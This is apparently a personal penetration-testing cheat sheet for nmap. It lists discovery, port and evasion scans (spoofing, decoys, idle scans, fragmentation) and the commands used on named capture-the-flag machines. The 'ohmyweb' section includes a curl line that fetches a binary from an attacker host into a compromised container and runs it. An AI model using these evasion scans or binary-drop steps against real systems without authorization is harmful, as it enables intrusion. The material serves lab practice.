# nmap

Network scanner used for port discovery, service detection and version fingerprinting. Usually the first step of every engagement to map open ports and running services on the target.

---

## Host Discovery

Any response from a host is an indication that it is online. Use `-sn` to limit the run to host discovery without port scanning.

| Scan Type              | Example Command                              |
|------------------------|----------------------------------------------|
| ARP Scan               | `sudo nmap -PR -sn MACHINE_IP/24`            |
| ICMP Echo Scan         | `sudo nmap -PE -sn MACHINE_IP/24`            |
| ICMP Timestamp Scan    | `sudo nmap -PP -sn MACHINE_IP/24`            |
| ICMP Address Mask Scan | `sudo nmap -PM -sn MACHINE_IP/24`            |
| TCP SYN Ping Scan      | `sudo nmap -PS22,80,443 -sn MACHINE_IP/30`   |
| TCP ACK Ping Scan      | `sudo nmap -PA22,80,443 -sn MACHINE_IP/30`   |
| UDP Ping Scan          | `sudo nmap -PU53,161,162 -sn MACHINE_IP/30`  |

| Option | Purpose                                         |
|--------|-------------------------------------------------|
| `-n`   | No DNS lookup                                   |
| `-R`   | Reverse DNS lookup for all hosts                |
| `-sn`  | Host discovery only (no port scan)              |

---

## Port Scanning

Three core scan types for discovering running TCP and UDP services on a target host.

| Port Scan Type  | Example Command               |
|-----------------|-------------------------------|
| Connect Scan    | `nmap -sT 10.130.164.74`      |
| TCP SYN Scan    | `sudo nmap -sS 10.130.164.74` |
| UDP Scan        | `sudo nmap -sU 10.130.164.74` |

| Option                  | Purpose                              |
|-------------------------|--------------------------------------|
| `-p-`                   | All ports                            |
| `-p1-1023`              | Scan ports 1 to 1023                 |
| `-F`                    | 100 most common ports                |
| `-r`                    | Scan ports in consecutive order      |
| `-T<0-5>`               | T0 slowest, T5 fastest               |
| `--max-rate 50`         | Rate ≤ 50 packets/sec                |
| `--min-rate 15`         | Rate ≥ 15 packets/sec                |
| `--min-parallelism 100` | At least 100 probes in parallel      |

---

## Advanced / Evasion Scans

These scan types rely on setting TCP flags in unexpected ways to prompt ports for a reply. Null, FIN, and Xmas scans provoke a response from **closed ports**, while Maimon, ACK, and Window scans provoke a response from **open and closed ports**.

| Port Scan Type       | Example Command                                          |
|----------------------|----------------------------------------------------------|
| Null Scan            | `sudo nmap -sN 10.129.168.83`                            |
| FIN Scan             | `sudo nmap -sF 10.129.168.83`                            |
| Xmas Scan            | `sudo nmap -sX 10.129.168.83`                            |
| Maimon Scan          | `sudo nmap -sM 10.129.168.83`                            |
| ACK Scan             | `sudo nmap -sA 10.129.168.83`                            |
| Window Scan          | `sudo nmap -sW 10.129.168.83`                            |
| Custom Scan          | `sudo nmap --scanflags URGACKPSHRSTSYNFIN 10.129.168.83` |
| Spoofed Source IP    | `sudo nmap -S SPOOFED_IP 10.129.168.83`                  |
| Spoofed MAC Address  | `nmap --spoof-mac SPOOFED_MAC`                           |
| Decoy Scan           | `nmap -D DECOY_IP,ME 10.129.168.83`                      |
| Idle (Zombie) Scan   | `sudo nmap -sI ZOMBIE_IP 10.129.168.83`                  |
| Fragment IP (8 bytes)  | `nmap -f 10.129.168.83`                                |
| Fragment IP (16 bytes) | `nmap -ff 10.129.168.83`                               |

| Option                  | Purpose                                      |
|-------------------------|----------------------------------------------|
| `--source-port PORT_NUM` | Specify source port number                  |
| `--data-length NUM`      | Append random data to reach the given length |

### Output & Verbosity

| Option    | Purpose                                    |
|-----------|--------------------------------------------|
| `--reason` | Explains how nmap made its conclusion     |
| `-v`       | Verbose                                   |
| `-vv`      | Very verbose                              |
| `-d`       | Debugging                                 |
| `-dd`      | More details for debugging                |

---

## Commands Used

### Standard two-phase pattern (most machines)
```bash
# Phase 1 — fast all-port SYN discovery
nmap -sS -p- -n -Pn --min-rate 5000 --open $TARGET -oN silent

# Phase 2 — service/version/script scan on confirmed ports only
nmap -sVC -p<PORTS> $TARGET -oN service
```
Used on: **Kenobi**, **Internal**, **Decryptify**, **Vulnerability Capstone**, **Team**, **IDE**, **Bookstore**, **Lookup**, **bsidesgtdav**, **bsidesgtthompson**, **coldvvars**, **Reactor**, **AttacktiveDirectory**, **DevHub**, **Aster**

### Targeted service scans from single-pass discovery
```bash
nmap -sVC -p22,80,3000 $TARGET -oN service
nmap -sVC -p22,80 $TARGET -oN service
nmap -sVC -p22,23,80,9999,20443,24433,28080,50628 $TARGET -oN service
nmap -sVC -p80 $TARGET -oN service
```
Used on: **davesblog**, **Gaara**, **hfb1royalrouter**, **Parcel** - targeted service/version scans after known open ports were identified.

### Minimal default scan
```bash
nmap $TARGET
```
Used on: **flower** - quick reachability and open-port check before web fuzzing.

### UDP scan for exposed VoIP/SIP services
```bash
nmap -sU --top-ports 2000 -n -Pn --min-rate 2000 $TARGET --open -oN udp-top-2000
nmap -sU -p- -n -Pn --min-rate 2000 $TARGET --open -oN udp-top-2000
```
Used on: **Aster**, **hfb1royalrouter** - checked UDP services after TCP enumeration, including SIP on `5060/udp`.

---

### Wreath — proxychains pivot (TCP-connect through SOCKS)
```bash
nmap -sS -p- -n -Pn --min-rate 5000 $TARGET -oN silent-web-server
nmap -sVC -p22,80,443,10000 $TARGET -oN service-web-server
proxychains nmap -sT -Pn -n 10.200.180.1-255 -oN scan
```
Used on: **Wreath** — `-sT` required when routing through proxychains (no raw sockets).

---

### Kobold / CCTV / DevArea — full TCP with scripts (no two-phase)
```bash
nmap -sC -sV -p- TARGET_IP
```
Used on: **Kobold**, **CCTV**, **DevArea**

---

### Overwatch — targeted AD port list (no ping, no DNS)
```bash
nmap -sVC -p53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,6520,9389,49664,49667,49958,49959,55427,57249,59340,59343 -Pn -n TARGET_IP
```
Used on: **Overwatch**

---

### ohmyweb — static binary drop inside stripped container
```bash
# Attacker — serve the binary
cd ~/static-bins && sudo python3 -m http.server 80
# https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap

# Inside the container
curl -fsSL http://$LHOST/nmap -o /tmp/nmap && chmod +x /tmp/nmap
/tmp/nmap 172.17.0.1 -p- --min-rate 5000
```
Used on: **ohmyweb** — found OMI/OMIGOD on `5986/tcp`. See: [container-network-pivoting.md](../../exploits/container/container-network-pivoting.md)

---

### Bandit — multi-target SYN scan from input file
```bash
# What it does: SYN-scan all ports across a list of IPs loaded from a file.
# Why here: enumerate multiple hosts in a network range without typing each IP.
nmap -sS -p- -n -Pn --min-rate 5000 -iL targets.txt --open -oN silent-targets

# Then service/version scan on confirmed ports per host
nmap -sVC -p 22,80,631,8002 10.200.30.101 -oN service-10.200.30.101
nmap -sVC -p 135,139,445,3389,5985 10.200.30.10 -oN service-10.200.30.10
```
Used on: **Bandit** — scanned the assigned network segment; discovered Ubuntu (ATS, CUPS, Hadoop) and Windows (RDP, WinRM, SMB) hosts.

- `-iL targets.txt` — read target IPs/ranges from a file instead of the command line
- One output file per host keeps service results cleanly separated
